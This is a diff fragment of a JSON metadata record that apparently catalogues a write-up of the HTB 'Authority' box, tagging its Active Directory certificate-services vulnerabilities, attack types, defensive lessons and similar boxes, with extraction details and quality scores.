+      "key_vulnerabilities": [
+        "esc1_certificate_template",
+        "pwm_configuration_mode",
+        "ansible_credential_exposure"
+      ],
+      "environment_type": "corporate_domain_controller",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "adcs_attacks",
+        "pass_the_cert",
+        "computer_account_abuse",
+        "ansible_security"
+      ],
+      "prerequisite_knowledge": [
+        "active_directory_fundamentals",
+        "certificate_services",
+        "ldap_protocols"
+      ]
+    },
+    "categorization": {
+      "primary_category": "active_directory",
+      "subcategories": [
+        "certificate_services",
+        "credential_access",
+        "computer_account_abuse"
+      ],
+      "attack_types": [
+        "credential_harvesting",
+        "certificate_abuse",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_certificate_templates",
+        "ansible_vault_security",
+        "pwm_hardening",
+        "computer_account_monitoring"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Escape",
+        "Support",
+        "Outdated"
+      ],
+      "similarity_reasons": [
+        "adcs_vulnerabilities",
+        "certificate_abuse",
+        "domain_controller_target"
+      ],
+      "unique_aspects": [
+        "pwm_configuration_abuse",
+        "ansible_playbook_enumeration",
+        "computer_account_enrollment",
+        "pass_the_cert_technique"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "certificate_services_knowledge",
+        "multiple_credential_sources"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:00:26.143074",
+    "original_file": "0xdf_writeups/Htb Authority.md",
+    "content_length": 50957,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
